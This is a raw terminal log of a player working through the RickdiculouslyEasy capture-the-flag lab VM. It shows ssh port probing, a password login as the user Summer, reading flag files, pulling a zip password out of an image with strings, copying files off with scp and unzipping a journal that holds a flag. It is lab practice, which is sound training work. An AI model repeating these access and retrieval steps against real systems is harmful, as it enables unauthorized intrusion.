+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 9000.
+debug1: connect to address 192.168.56.103 port 9000: Connection refused
+ssh: connect to host 192.168.56.103 port 9000: Connection refused
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 90000 -v
+Bad port '90000'
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 2222 -v 
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 2222.
+debug1: connect to address 192.168.56.103 port 2222: Connection refused
+ssh: connect to host 192.168.56.103 port 2222: Connection refused
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ssh Summer@192.168.56.103 -p 22222 -v
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22222.
+debug1: Connection established.
+debug1: identity file /home/kali/.ssh/id_rsa type -1
+debug1: identity file /home/kali/.ssh/id_rsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa-cert type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk type -1
+debug1: identity file /home/kali/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519 type -1
+debug1: identity file /home/kali/.ssh/id_ed25519-cert type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk type -1
+debug1: identity file /home/kali/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /home/kali/.ssh/id_xmss type -1
+debug1: identity file /home/kali/.ssh/id_xmss-cert type -1
+debug1: identity file /home/kali/.ssh/id_dsa type -1
+debug1: identity file /home/kali/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.5
+debug1: compat_banner: match: OpenSSH_7.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
+debug1: Authenticating to 192.168.56.103:22222 as 'Summer'
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: checking without port identifier
+debug1: load_hostkeys: fopen /home/kali/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /home/kali/.ssh/known_hosts2 does not exist
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /etc/ssh/ssh_known_hosts does not exist
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /etc/ssh/ssh_known_hosts2 does not exist
+The authenticity of host '[192.168.56.103]:22222 ([192.168.56.103]:22222)' can't be established.
+ED25519 key fingerprint is SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '[192.168.56.103]:22222' (ED25519) to the list of known hosts.
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: get_agent_identities: bound agent to hostkey
+debug1: get_agent_identities: ssh_fetch_identitylist: agent contains no identities
+debug1: Will attempt key: /home/kali/.ssh/id_rsa 
+debug1: Will attempt key: /home/kali/.ssh/id_ecdsa 
+debug1: Will attempt key: /home/kali/.ssh/id_ecdsa_sk 
+debug1: Will attempt key: /home/kali/.ssh/id_ed25519 
+debug1: Will attempt key: /home/kali/.ssh/id_ed25519_sk 
+debug1: Will attempt key: /home/kali/.ssh/id_xmss 
+debug1: Will attempt key: /home/kali/.ssh/id_dsa 
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,null>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000)
+
+
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_1000)
+
+
+debug1: Unspecified GSS failure.  Minor code may provide more information
+No such file or directory
+
+
+debug1: Next authentication method: publickey
+debug1: Trying private key: /home/kali/.ssh/id_rsa
+debug1: Trying private key: /home/kali/.ssh/id_ecdsa
+debug1: Trying private key: /home/kali/.ssh/id_ecdsa_sk
+debug1: Trying private key: /home/kali/.ssh/id_ed25519
+debug1: Trying private key: /home/kali/.ssh/id_ed25519_sk
+debug1: Trying private key: /home/kali/.ssh/id_xmss
+debug1: Trying private key: /home/kali/.ssh/id_dsa
+debug1: Next authentication method: password
+Summer@192.168.56.103's password: 
+Authenticated to 192.168.56.103 ([192.168.56.103]:22222) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: searching /home/kali/.ssh/known_hosts2 for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: hostkeys file /home/kali/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "en_US.UTF-8"
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+Learned new hostkey: ECDSA SHA256:rP4CX/V9xNZay9srIUBRq2BFQTnmxUO9cs1F3E9yzg0
+Adding new key for [192.168.56.103]:22222 to /home/kali/.ssh/known_hosts: ecdsa-sha2-nistp256 SHA256:rP4CX/V9xNZay9srIUBRq2BFQTnmxUO9cs1F3E9yzg0
+debug1: update_known_hosts: known hosts file /home/kali/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+Last login: Wed Aug 23 19:20:29 2017 from 192.168.56.104
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ cat FLAG.txy
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+[Summer@localhost ~]$ cat FLAG.txt
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+[Summer@localhost ~]$ tail FLAG.txt
+FLAG{Get off the high road Summer!} - 10 Points
+[Summer@localhost ~]$ 
+::1                      localhost                localhost4               localhost4.localdomain4  localhost6               localhost6.localdomain6  localhost.localdomain    
+[Summer@localhost ~]$ ls
+FLAG.txt
+[Summer@localhost ~]$ cd..
+-bash: cd..: command not found
+[Summer@localhost ~]$ cd ..
+[Summer@localhost home]$ ls
+Morty  RickSanchez  Summer
+[Summer@localhost home]$ cd Morty
+[Summer@localhost Morty]$ ls
+journal.txt.zip  Safe_Password.jpg
+[Summer@localhost Morty]$ string Safe_Pawssword.jpg
+-bash: string: command not found
+[Summer@localhost Morty]$ strings Safe_Password.jpg
+-bash: strings: command not found
+[Summer@localhost Morty]$ cat Safe_Password.jpg
+                         _
+                        | \
+                        | |
+                        | |
+   |\                   | |
+  /, ~\                / /
+ X     `-.....-------./ /
+  ~-. ~  ~              |
+     \             /    |
+      \  /_     ___\   /
+      | /\ ~~~~~   \  |
+      | | \        || |
+      | |\ \       || )
+     (_/ (_/      ((_/
+
+[Summer@localhost Morty]$ strings Safe_Password.jpg
+-bash: strings: command not found
+[Summer@localhost Morty]$ head Safe_Password.jpg
+    JFIF``   ExifMM▒J( iZ``  P 8  8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek8BIM8BIM%               B~ 8P"  
+
+   }!1AQa"q2  #B  R  $3br 
+▒▒%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                           
+
+   w!1AQaq"2B           #3R br 
+$4 % ▒▒&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz                                                                          C00D000D\DDDD\t\\\\\t tttttt                               C"$$848`44`最                                                     5  
+                ?Ӣ +P  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (    
+ ,o   Y  B W  @ޠV  1   (  3
+(  
+ɹ h  l? _  j(j Nڣ9E   с3 }   U  dGQ XJ6:a; b ST1w  M (    OPKր(    xժ m   ѫ4 1 (  QEn U C
+(  
+   ) 1 C(a/  lsRS' QE !!Ac S  3?ڤ ? We7 e Տ   P x   aV]  Q  d k? n 5  | Z  E?   tS   E: :ƿ 5Bvt  u}   r
+[Summer@localhost Morty]$ strings jibber Safe_Password.jpg
+-bash: strings: command not found
+[Summer@localhost Morty]$ strings Safe_Password.jpg
+-bash: strings: command not found
+[Summer@localhost Morty]$ assword: Me^C
+[Summer@localhost Morty]$ ^C
+[Summer@localhost Morty]$ exit
+logout
+debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.56.103 closed.
+Transferred: sent 10280, received 17868 bytes, in 884.3 seconds
+Bytes per second: sent 11.6, received 20.2
+debug1: Exit status 130
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo ssh Summer@192.168.56.103 -p 22222 -v                          
+[sudo] password for kali: 
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22222.
+debug1: Connection established.
+debug1: identity file /root/.ssh/id_rsa type -1
+debug1: identity file /root/.ssh/id_rsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa type -1
+debug1: identity file /root/.ssh/id_ecdsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /root/.ssh/id_ed25519 type -1
+debug1: identity file /root/.ssh/id_ed25519-cert type -1
+debug1: identity file /root/.ssh/id_ed25519_sk type -1
+debug1: identity file /root/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /root/.ssh/id_xmss type -1
+debug1: identity file /root/.ssh/id_xmss-cert type -1
+debug1: identity file /root/.ssh/id_dsa type -1
+debug1: identity file /root/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.5
+debug1: compat_banner: match: OpenSSH_7.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
+debug1: Authenticating to 192.168.56.103:22222 as 'Summer'
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: SSH2_MSG_KEXINIT sent
+debug1: SSH2_MSG_KEXINIT received
+debug1: kex: algorithm: curve25519-sha256
+debug1: kex: host key algorithm: ssh-ed25519
+debug1: kex: server->client cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: kex: client->server cipher: chacha20-poly1305@openssh.com MAC: <implicit> compression: none
+debug1: expecting SSH2_MSG_KEX_ECDH_REPLY
+debug1: SSH2_MSG_KEX_ECDH_REPLY received
+debug1: Server host key: ssh-ed25519 SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: checking without port identifier
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /root/.ssh/known_hosts2: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts: No such file or directory
+debug1: load_hostkeys: fopen /etc/ssh/ssh_known_hosts2: No such file or directory
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /root/.ssh/known_hosts does not exist
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /root/.ssh/known_hosts2 does not exist
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /etc/ssh/ssh_known_hosts does not exist
+debug1: hostkeys_find_by_key_hostfile: hostkeys file /etc/ssh/ssh_known_hosts2 does not exist
+The authenticity of host '[192.168.56.103]:22222 ([192.168.56.103]:22222)' can't be established.
+ED25519 key fingerprint is SHA256:RD+qmhxymhbL8Ul9bgsqlDNHrMGfOZAR77D3nqLNwTA.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.56.103]:22222' (ED25519) to the list of known hosts.
+debug1: rekey out after 134217728 blocks
+debug1: SSH2_MSG_NEWKEYS sent
+debug1: expecting SSH2_MSG_NEWKEYS
+debug1: SSH2_MSG_NEWKEYS received
+debug1: rekey in after 134217728 blocks
+debug1: Will attempt key: /root/.ssh/id_rsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa 
+debug1: Will attempt key: /root/.ssh/id_ecdsa_sk 
+debug1: Will attempt key: /root/.ssh/id_ed25519 
+debug1: Will attempt key: /root/.ssh/id_ed25519_sk 
+debug1: Will attempt key: /root/.ssh/id_xmss 
+debug1: Will attempt key: /root/.ssh/id_dsa 
+debug1: SSH2_MSG_EXT_INFO received
+debug1: kex_input_ext_info: server-sig-algs=<ssh-ed25519,ssh-rsa,rsa-sha2-256,rsa-sha2-512,ssh-dss,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,null>
+debug1: SSH2_MSG_SERVICE_ACCEPT received
+debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
+debug1: Next authentication method: gssapi-with-mic
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: No credentials were supplied, or the credentials were unavailable or inaccessible
+No Kerberos credentials available (default cache: FILE:/tmp/krb5cc_0)
+
+
+debug1: Unspecified GSS failure.  Minor code may provide more information
+No such file or directory
+
+
+debug1: Next authentication method: publickey
+debug1: Trying private key: /root/.ssh/id_rsa
+debug1: Trying private key: /root/.ssh/id_ecdsa
+debug1: Trying private key: /root/.ssh/id_ecdsa_sk
+debug1: Trying private key: /root/.ssh/id_ed25519
+debug1: Trying private key: /root/.ssh/id_ed25519_sk
+debug1: Trying private key: /root/.ssh/id_xmss
+debug1: Trying private key: /root/.ssh/id_dsa
+debug1: Next authentication method: password
+Summer@192.168.56.103's password: 
+Authenticated to 192.168.56.103 ([192.168.56.103]:22222) using "password".
+debug1: channel 0: new session [client-session] (inactive timeout: 0)
+debug1: Requesting no-more-sessions@openssh.com
+debug1: Entering interactive session.
+debug1: pledge: filesystem
+debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: searching /root/.ssh/known_hosts2 for [192.168.56.103]:22222 / (none)
+debug1: client_input_hostkeys: hostkeys file /root/.ssh/known_hosts2 does not exist
+debug1: Sending environment.
+debug1: channel 0: setting env LANG = "en_US.UTF-8"
+debug1: client_global_hostkeys_prove_confirm: server used untrusted RSA signature algorithm ssh-rsa for key 0, disregarding
+Learned new hostkey: ECDSA SHA256:rP4CX/V9xNZay9srIUBRq2BFQTnmxUO9cs1F3E9yzg0
+Adding new key for [192.168.56.103]:22222 to /root/.ssh/known_hosts: ecdsa-sha2-nistp256 SHA256:rP4CX/V9xNZay9srIUBRq2BFQTnmxUO9cs1F3E9yzg0
+debug1: update_known_hosts: known hosts file /root/.ssh/known_hosts2 does not exist
+debug1: pledge: fork
+Last login: Fri Oct 27 18:23:40 2023 from 192.168.56.104
+[Summer@localhost ~]$ exitdebug1: client_input_channel_req: channel 0 rtype exit-status reply 0
+debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
+
+logout
+debug1: channel 0: free: client-session, nchannels 1
+Connection to 192.168.56.103 closed.
+Transferred: sent 2872, received 2912 bytes, in 5.1 seconds
+Bytes per second: sent 568.2, received 576.1
+debug1: Exit status 0
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo scp -P 22222 Summer@192.168.56.103:/home/Morty/Safe_Password.jpg
+usage: scp [-346ABCOpqRrsTv] [-c cipher] [-D sftp_server_path] [-F ssh_config]
+           [-i identity_file] [-J destination] [-l limit] [-o ssh_option]
+           [-P port] [-S program] [-X sftp_option] source ... target
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo scp -P 22222 Summer@192.168.56.103:/home/Morty/Safe_Password.jpg .
+Summer@192.168.56.103's password: 
+Safe_Password.jpg                                                                 100%   42KB   3.5MB/s   00:00    
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ls
+FLAG.txt  hints.txt  Safe_Password.jpg
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ strings Safe_Password.jpg                                              
+JFIF
+Exif
+8 The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
+8BIM
+8BIM
+$3br
+%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+        #3R
+&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz
+0D000D\DDDD\t\\\\\t
+tttttt
+"$$848`44`
+XJ6:a;
+ST1w
+!!Ac
+5Bvt
+(4Q@
+kjFU
+QEjd
+Enr6
+E6Lv
+R(+6
+I_B&
+-%-0?
+y?*<
+x~t\
+QT@QE
+hQ@\
+1M:e
+QL.R
+QESg
+4)lm
+lclj
+EIch
+QLAE
+C<)<f7
+zq"r
+QE2B
+b%-%-
+%8Sd!
+SiE!
+FEk:
+{{&r&
+QEE3
+-%-0?
+JE%2
+lTur
+QHaU[
+EjVV
+Y}u7?
+7S@2
+QE!8
+QH)jKB
+@ijK
+,jVU
+t}+2
+%q)\
+KAE%-1
+QE2B
+s!g>
+)0=*\n\f
+M6`Ne
+*}}kV
+e+4f
+ZkH'
+2z+3u
+AS'd8
+JZJ(
+QIKLFU
++AUTmQ
+UB(E
+-%-%
+bhJ(
+RaHE-
+621C
+QMwTR
+%-%-
+IKI@
+>mB_H
+h",h
+\WQ@
+W=Ms
+QT@QE
+HE14%e]
+vQ:u
+Z4Qa]
+\P6-
+` D_
+V=MY
+Q@      E-%
+E-%0
+aE%-0
+Zm(4
+LZB)h
+_AZ5
+QLwX
+QLC]U
+Ck'o
+}ElU[
+Uh&f&
+}MiVv
+E/ZEn%
+j+xa
+$9v3
+qWj9"
+es#F
+QKI@
+QEAAE
+QIKH
+-?y'
+}jj(
+5#"7
+$W?#;dg
+dfy:
+\,f}
+-ibn
+QRPQE
+QE2I
+f.TUK
+mOV+
+\`Qp
+TS#q"
+ZBUF
+MD3yv
+5UPm@
+*x"X"X
+L0:QE
+b\ZCo2HFbn
+8P$`(
+8lU[
+`qKY
+Z&CL
+(MBI
+QTHQE
+W,Ou
+QPPQE
+O#R_
+3U=#A
+^?Jf5S
+hVOse
+U1cr
+eh:D
+kl:D
+f?3E
+[kpw
+#,X\7
+on:F
+Z4Q`
+rz[?
+Z4Q`
+p1+!
+hVOse
+EOR1,
+y3Kh{
+^iOV`
+QLE[
+RQK@
+QLAE
+E-%H
+S@lQE
+QHHPY
+JZJ(
+QPM2
+:IV!
+ufL(
+c';F3RQEY!E
+QEC4
+OJC(Z
+:YcI
+ZlG#d
+k]UQB
+)md3
+/QYGP
++:"nn
+PH9S
+r=kH
+QIK@
+Ys]=
+QRPQE
+bD8aV
+XZ7;
+"v?LQ
+!_nM
+H}d5
+=fPQE
+69VA
+TlQU
+k>[Y#s=
+l$9W$
+Z's&
+/!}jZ
+CH(&
+EgEpc
+!Af8
+S>}BB3
+c<rqW
+*[ad
+PQFE
+/Z)*
+,EfF
+~9VA
+S       8<5MTA
+'OJM
+U;.P
+UOSV
+Z))h
+jZ->
+QSVj
+Ufei`
+8=kV
+B3Oed;[
+CLre
+wAcN
+=CwbM_# 
+~Tbh
+b3*)v
+UOS@1-
+QLAE
+4UH$
+Fpzv5
+aMgT
+_VWP
+)Fc`
+QEdt
+U=MZ
+,Rloj
+,T2I
+FGoje
+E_GY
+QFsEQ
+^]:7
+Q[46
+mW9=
+-.`2
+SMn'
+&       [&
+Z)3Fi
+QRSW4#
+RQLFc
+O}pm
+++_8
+AC0`
+5Nh^
+9P}E
++:7(
+40Fe
+=EMY
+NE_G
+GQSQL
+QHaG
+Fo-G
+Mn7>
+2OAZ
+(lnW3%
+Xg*Hn
+Lu+A
+K/u8
+{di$w
+uGABB-@
+U=MZ
+tUF2
+m2,|
+5JW3
+@kTr
+a!h|
+{5iT3
+(iwj
+!U=@
+Tn?}{
+tuF2
+CV4R
+Zu%'N
+QVk7
+"nt(}
+5^+x
+:U%NA?
+,<HFN1@
+p~u-
+?t5-
+k:^g
+UOS@2
+OzIz
+        8?+
+Z*/-
+.KEE
+3}MX
+U=MZ
+tuF2
+BqHOa
+Z       !H
+kpi*v-
+PVV+
+wrdcmn
+Z}Kf
+Zk6:Td
+}jZd
+`GV 
+G.p:S
+J@V^
+hXCu
+f.D[
+:xe=
+QG0r
+>9J B
+2yWr
+@irOE?
+TjQRPQK
+UIom
+Vm2 w@
+)_5?
+AKEH
+Pww?
+d5Vo
+aB      lnD
+?*V+
+H.b'
+2zV[
+woaZ
+Nne'
+Fo-GYW
+j*amn:F
+}EQ:e
+4r=i7/
+42=E-f
+KR4v
+)vTP:
+pco~
+r)k4
+OB)r=E
+;UE;5%=
+UOS@1
+3^T'
+jDI8
+c!;o
+ITc-
+b/&/
+w[H?
+?2}*d
+=kAY]C
+H@`A
+PHQE
+[{y.\]]
+=MgZ
+Nn.9r8
+P@QE
+qA rj
+i\]]
+=)mm^W
+d1Iw/
+&^55
+tQEY
+$k,m
+*Tu#
+MKQC
+GNjV~
+JFN*
+,Hds
+*+[v
+qwr8
+k0PY
+z1wl
+4QEY
+v=rA
+4jQE
+p2k;L
+;<?g
+$Q$(
+$1$(
+Z3HB
+U&;u
+-?{w<
+iS]U
+RsGZ
+tf;D
+U,Nm#
+"xZ#
+Op+CO
+QT@QE
+E27YQd^
+QQI<
+ALe/
+4QLAE
+us#?
+H^M7
+TQEYe
+QBwB
+QM$qD
+Y$HP
+yRy-
+QLAE
+^\N{
+tSi`
+RVgGB
+jjLe
+ZfRVb
+TQE@
+\Iw!
+qIKEI!E
+lpjj
+tZkpF
+QVXQE
+?JK^-
+xN"_
+6Ka@8
+Q#m>
+E[N/
+tRe!
+G;VaE
+TQE@
+Akrr
+MEE0,
+/,yc
+p`oI
+EfCq%
+3$Go
+[H-.
+4QEYaE
+H,`<
+6w- 0
+il`B
+K.=G
+EK5B
+UOS@
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo scp -P 22222 Summer@192.168.56.103:/home/Morty/journal.txt.zip .  
+Summer@192.168.56.103's password: 
+journal.txt.zip                                                                   100%  414    62.2KB/s   00:00    
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ls
+FLAG.txt  hints.txt  journal.txt.zip  Safe_Password.jpg
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ unzip journal.txt.zip 
+Archive:  journal.txt.zip
+[journal.txt.zip] journal.txt password: 
+password incorrect--reenter: 
+password incorrect--reenter: 
+  inflating: journal.txt             
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ ls
+FLAG.txt  hints.txt  journal.txt  journal.txt.zip  Safe_Password.jpg
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ cat journal.txt                
+Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
+
+Anyway. Here it is:
+
+FLAG: {131333} - 20 Points 
+                                                                                                                    
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo scp -P 22222 Summer@192.168.56.103                              
+[sudo] password for kali: 
+usage: scp [-346ABCOpqRrsTv] [-c cipher] [-D sftp_server_path] [-F ssh_config]
+           [-i identity_file] [-J destination] [-l limit] [-o ssh_option]
+           [-P port] [-S program] [-X sftp_option] source ... target
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/RickdiculouslyEasy]
+└─$ sudo ssh Summer@192.168.56.103 -p 22222 -v                           
+OpenSSH_9.3p2 Debian-1, OpenSSL 3.0.10 1 Aug 2023
+debug1: Reading configuration data /etc/ssh/ssh_config
+debug1: /etc/ssh/ssh_config line 19: include /etc/ssh/ssh_config.d/*.conf matched no files
+debug1: /etc/ssh/ssh_config line 21: Applying options for *
+debug1: Connecting to 192.168.56.103 [192.168.56.103] port 22222.
+debug1: Connection established.
+debug1: identity file /root/.ssh/id_rsa type -1
+debug1: identity file /root/.ssh/id_rsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa type -1
+debug1: identity file /root/.ssh/id_ecdsa-cert type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk type -1
+debug1: identity file /root/.ssh/id_ecdsa_sk-cert type -1
+debug1: identity file /root/.ssh/id_ed25519 type -1
+debug1: identity file /root/.ssh/id_ed25519-cert type -1
+debug1: identity file /root/.ssh/id_ed25519_sk type -1
+debug1: identity file /root/.ssh/id_ed25519_sk-cert type -1
+debug1: identity file /root/.ssh/id_xmss type -1
+debug1: identity file /root/.ssh/id_xmss-cert type -1
+debug1: identity file /root/.ssh/id_dsa type -1
+debug1: identity file /root/.ssh/id_dsa-cert type -1
+debug1: Local version string SSH-2.0-OpenSSH_9.3p2 Debian-1
+debug1: Remote protocol version 2.0, remote software version OpenSSH_7.5
+debug1: compat_banner: match: OpenSSH_7.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
